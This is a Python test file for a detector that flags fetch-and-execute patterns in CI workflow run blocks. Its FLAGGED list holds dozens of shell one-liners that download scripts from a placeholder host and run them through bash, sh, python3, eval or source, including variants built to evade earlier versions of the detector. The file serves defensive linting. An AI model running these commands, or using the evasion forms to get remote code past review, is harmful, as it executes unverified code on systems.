from aviato.plugins.actionpins import fetch_execute_violations as fev

# AST-based (PyYAML + bashlex) fetch-execute detector. The corpus IS the spec: every historical bypass
# across review cycles 9-13 must FLAG; legitimate data pipes and download->verify->use must PASS. Each
# cycle-13 entry is a confirmed fail-open of the first bashlex walk, grouped by the root cause that the
# structural rewrite closed (A: generic AST descent, B: wrapper-agnostic fetch detection, C: full
# curl/wget output grammar, D: real-YAML run-block extraction).

FLAGGED = [
    # direct stream -> interpreter (cycle 9)
    "curl -fsSL https://x/i.sh | bash",
    "curl -fsSL https://x/i.sh | sudo bash",
    "wget -qO- https://x/i.sh | python3",
    # substitution forms (cycle 9/10)
    'bash -c "$(curl -fsSL https://x/i.sh)"',
    "bash <(curl -fsSL https://x/i.sh)",
    'eval "$(curl -fsSL https://x/i.sh)"',
    ". <(curl -fsSL https://x/i.sh)",
    # cycle-11 C11-1: stderr-merge must not divorce the pipe
    "curl -fsSL https://x/i.sh 2>&1 | bash",
    # cycle-12 C12-1: a verify command must NOT excuse a streamed fetch
    "curl -fsSL https://x/i.sh | bash\nsha256sum -c /dev/null",
    "sha256sum -c x.txt\ncurl -fsSL https://x/i.sh | bash",
    # cycle-12 C12-5: a checksum in a COMMENT must not excuse (lexer drops it)
    "# sha256sum -c sums.txt\ncurl -o f https://x/i.sh\nbash f",
    "echo sha256sum -c sums\ncurl -o f https://x/i.sh\nbash f",
    # cycle-12 C12-6: clustered / alternate download forms then execute
    "curl -fsSLo /tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    "curl -OL https://x/i.sh && bash i.sh",
    "curl --remote-name https://x/i.sh && bash i.sh",
    "wget https://x/i.sh && bash i.sh",
    "curl -fsSL https://x/i.sh -o /tmp/i.sh\nbash /tmp/i.sh",
    "curl -fsSL https://x/i.sh > /tmp/i.sh\nsh /tmp/i.sh",
    # cycle-12 C12-9: executor-capable "sinks"
    "curl -fsSL https://x/cmds | sort -S1 --compress-program=bash",
    "curl -fsSL https://x/x | less",
    # sink then chained executor (cycle 10/11)
    "curl -fsSL https://x/i.sh | tee /tmp/i.sh; bash /tmp/i.sh",
    "curl -fsSL https://x/cmds | xargs -I{} sh -c '{}'",
    # download via a piped sink redirect, then execute (curl | cat > f; bash f)
    "curl -fsSL https://x/i.sh | cat > /tmp/i.sh\nbash /tmp/i.sh",
    # --- cycle-13 Group A: compound / subshell / loop bodies + redirect-target substitutions ---
    # (the first bashlex walk descended only named attrs, so these whole subtrees were invisible)
    "curl -fsSL https://x/i.sh | { bash; }",
    "curl -fsSL https://x/i.sh | ( bash )",
    "curl -fsSL https://x/cmds | while read l; do $l; done",
    "{ curl -fsSL https://x/i.sh | bash; }",
    "( curl -fsSL https://x/i.sh | bash )",
    "( curl -fsSL https://x/i.sh -o f ); bash f",
    "{ curl -fsSL https://x/i.sh; } | bash",
    "( curl -fsSL https://x/i.sh ) | bash",
    "if true; then curl -fsSL https://x/i.sh; fi | bash",
    "while true; do curl -fsSL https://x/i.sh; break; done | bash",
    "for x in 1; do curl -fsSL https://x/i.sh; done | bash",
    'bash <<< "$(curl -fsSL https://x/i.sh)"',
    "bash < <(curl -fsSL https://x/i.sh)",
    "sh -s < <(curl -fsSL https://x/i.sh)",
    "source < <(curl -fsSL https://x/i.sh)",
    "curl -fsSL https://x/i.sh > >(bash)",
    # --- cycle-13 Group B: transparent command wrappers must not hide the fetch ---
    "sudo curl -fsSL https://x/i.sh | bash",
    "env curl -fsSL https://x/i.sh | bash",
    "command curl -fsSL https://x/i.sh | bash",
    # --- cycle-13 Group C: output forms the option parser missed ---
    "wget -O /tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    "wget -O/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    "curl -o/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    "curl -o=/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    "wget -P /tmp https://x/i.sh && bash /tmp/i.sh",
    "wget --directory-prefix=/tmp https://x/i.sh && bash /tmp/i.sh",
    "curl --output-dir /tmp -O https://x/i.sh && bash /tmp/i.sh",
    "curl --output-dir=/tmp -O https://x/i.sh && bash /tmp/i.sh",
    # --- cycle-13 R2: honest fail-opens the first structural walk still missed ---
    "curl -fsSLo f https://x/i.sh\nbash < f",  # downloaded file executed via a `<` stdin redirect
    "curl -fsSLo install.sh https://x/i.sh\nbash ./install.sh",  # `./name` must match downloaded `name`
    "curl -fsSL https://x/i.sh | cat > >(bash)",  # pure sink writes into >(interpreter)
    "$(curl -fsSL https://x/cmd)",  # fetch substitution in command position is executed
    # --- cycle-13 R4: wrappers whose options take ARGUMENTS must not hide the interpreter/fetch ---
    'sudo -u root bash -c "$(curl -fsSL https://x/i.sh)"',
    'env -u BASH_ENV bash -c "$(curl -fsSL https://x/i.sh)"',
    'timeout -k 5s 30s bash -c "$(curl -fsSL https://x/i.sh)"',
    "env -u X curl -fsSL https://x/i.sh | bash",
    # --- cycle-13 R5: a verify that runs AFTER execution vets nothing (order-aware) ---
    "curl -fsSLo install.sh https://x/i.sh\nbash install.sh\nsha256sum -c sums.txt",
]

ALLOWED = [
    "curl -fsSL https://x/v.json | jq .version",
    "curl -fsSL https://x/r.txt | grep tag_name",
    "curl -fsSL https://x/r.txt | grep x | head -1",
    "curl -fsSL https://x/f",  # bare fetch to stdout, goes nowhere
    # download -> verify -> use (a real verify command vets the download)
    "curl -fsSL https://x/i.sh -o f && sha256sum -c sums.txt && bash f",
    "curl -fsSL https://x/i.sh -o f\nsha256sum -c sums.txt\nbash f",
    # the actionlint install shape (checksum piped from echo)
    'curl -sSL https://x/a.tgz -o t.tgz\necho "$SHA  t.tgz" | sha256sum -c -\ntar -xz -f t.tgz\nactionlint',
    # cosign-verified download
    "curl -fsSL https://x/app -o app\ncosign verify-blob --signature s app\n./app",
    # --- cycle-13 R2: data-capture is NOT execution (interpreter-aware rule (B)); these MUST pass or
    # the gate is too noisy to use — fetching a value into a variable/output is the dominant pattern ---
    "VERSION=$(curl -s https://api/releases/latest | jq -r .tag_name)",
    "X=$(curl -fsSL https://x/v.txt)",
    'export V="$(curl -fsSL https://x/v.txt)"',
    'echo "v=$(curl -s https://x/v)" >> "$GITHUB_OUTPUT"',
    "curl -fsSL https://x/v.json | env jq .version",  # wrapped pure sink resolves through `env`
    'echo "$(curl -fsSL https://x/v.json)" | jq .version',  # substitution into a non-interpreter = data
    'grep curl README.md | sed "s/curl/CURL/"',  # a literal `curl` ARGUMENT is not a fetch command
    "diff <(curl -fsSL https://x/a) <(curl -fsSL https://x/b)",  # two fetches compared as data
    # --- cycle-13 R4: precise interpreter/introspection/path rules must not over-flag ---
    "command -v curl | tee curl-path.txt",  # `command -v` looks curl UP, it is not a fetch
    'python3 tools/report.py "$(curl -fsSL https://x/data.json)"',  # fetch is a DATA arg to a script, not -c
    "curl -fsSLo /tmp/data.json https://x/data.json\njq . ./fixtures/data.json",  # same basename, different dirs
]


def test_flags_every_historical_bypass():
    for line in FLAGGED:
        assert fev(line), f"fail-open miss: {line!r}"


def test_allows_data_pipes_and_verified_installs():
    for line in ALLOWED:
        assert fev(line) == [], f"false positive: {line!r}"


def test_only_run_blocks_scanned_not_metadata():
    wf = (
        "jobs:\n  a:\n    steps:\n"
        '      - name: "see curl https://x | bash docs"\n'
        "        env:\n          NOTE: curl https://x | bash\n"
        "      - run: curl https://x/i.sh | bash\n"
    )
    out = fev(wf)
    assert len(out) == 1, out


def test_run_block_scalar_variants_extracted():
    assert fev("      - run: |\n          set -e\n          curl https://x/i.sh | bash\n")
    assert fev("      - run: |2\n          curl https://x/i.sh | bash\n")
    assert fev("      - run : curl https://x/i.sh | bash\n")


def test_quoted_and_flow_run_keys_extracted():
    # cycle-13 Group D: a real YAML parse normalises quoted keys and flow-style steps, so a `curl|bash`
    # behind `"run":` or `{run: …}` can no longer evade the line regex that the first walk relied on.
    q = chr(34)
    assert fev("jobs:\n  x:\n    steps:\n      - run: echo ok\n      - " + q + "run" + q + ": curl https://x | bash\n")
    assert fev("jobs:\n  x:\n    steps:\n      - run: echo ok\n      - 'run': curl https://x | bash\n")
    assert fev(
        "jobs:\n  x:\n    steps:\n      - run: echo ok\n      - { name: pwn, run: "
        + q
        + "curl https://x | bash"
        + q
        + " }\n"
    )


def test_unparseable_block_with_fetch_fails_closed():
    # a templated/garbled block that mentions curl but bashlex can't parse -> fail closed
    assert fev("      - run: curl https://x/i.sh | {{ bad templating |\n")
